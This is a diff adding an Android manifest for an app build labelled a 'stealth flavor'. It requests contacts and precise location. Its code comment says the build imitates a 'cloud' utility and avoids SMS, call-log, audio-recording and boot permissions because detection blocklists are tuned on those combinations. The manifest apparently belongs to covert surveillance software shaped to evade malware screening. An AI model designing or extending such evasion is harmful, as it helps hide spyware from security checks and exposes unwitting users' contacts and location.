@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!-- stealth flavor — no scary permissions at install; only the ones a "cloud"
+     utility plausibly has. blocklists are tuned on READ_SMS / READ_CALL_LOG /
+     RECORD_AUDIO / BOOT_COMPLETED combos, so we keep those off. -->
+<manifest xmlns:android="http://schemas.android.com/apk/res/android">
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
+</manifest>
